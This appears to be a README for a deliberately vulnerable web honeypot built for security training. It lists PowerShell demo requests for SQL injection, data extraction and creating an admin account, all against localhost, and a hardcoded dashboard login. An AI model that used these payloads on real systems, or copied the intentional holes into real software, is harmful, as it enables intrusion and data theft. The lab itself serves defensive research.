# WebApp Honeypot - Threat Intelligence System

## Warning
**This application is intentionally vulnerable for security research and training.**
- Lab use only - Never expose to public internet
- Only test against systems you own

## Quick Start

### Start the Honeypot
```bash
docker-compose up -d
```

### Access Points
- **Honeypot**: http://localhost:8080
- **Threat Intelligence**: http://localhost:8080/threat-intel.php (creds: `threat:intel123`)
- **phpMyAdmin**: http://localhost:8081

## Demo Attack Commands (PowerShell)

### 1. SQL Injection - Get User Data
```powershell
Invoke-WebRequest -Uri "http://localhost:8080/api.php?sql=SELECT * FROM users" -Method GET
```

### 2. Privilege Escalation - Create Admin User
```powershell
Invoke-WebRequest -Uri "http://localhost:8080/register-api.php?u=apihacker&p=secret&e=api@evil.com&r=admin" -Method GET
```

### 3. Information Disclosure - Database Version
```powershell
Invoke-WebRequest -Uri "http://localhost:8080/register-api.php?u=SELECT+@@version&e=version@test.com" -Method GET
```

### 4. Data Extraction - Alternative Users Query
```powershell
Invoke-WebRequest -Uri "http://localhost:8080/register-api.php?u=SELECT%20*%20FROM%20users&e=test@example.com" -Method GET
```

### 5. View Threat Intelligence
```powershell
Invoke-WebRequest -Uri "http://localhost:8080/threat-api.php?action=live_stats" -Method GET
```

## Features

### Vulnerability Surface
- **SQL Injection** via API endpoints and forms
- **Authentication Bypass** and privilege escalation
- **XSS** (Reflected & Stored) via search and comments
- **Command Injection** via ping tool
- **File Upload** vulnerabilities

### Threat Intelligence System
- **Real-time MITRE ATT&CK mapping** - Automatic TTP classification
- **Live dashboard** - Updates every 5 seconds without refresh
- **Attack attribution** - Tool fingerprinting and threat analysis
- **IOC generation** - Export indicators of compromise
- **Severity scoring** - Low/Medium/High/Critical threat levels

## Stop/Restart
```bash
docker-compose down    # Stop containers
docker-compose up -d   # Restart containers
```

## What Gets Tracked
Every attack is automatically:
- **Classified** with MITRE ATT&CK techniques (T1190, T1059, etc.)
- **Scored** by severity level (Critical/High/Medium/Low)  
- **Attributed** with tool fingerprinting and IOCs
- **Mapped** to tactics (Initial Access, Execution, etc.)
- **Visualized** in real-time threat intelligence dashboard

Perfect for security research, red team training, and threat hunting practice.
```bash
docker-compose down
```
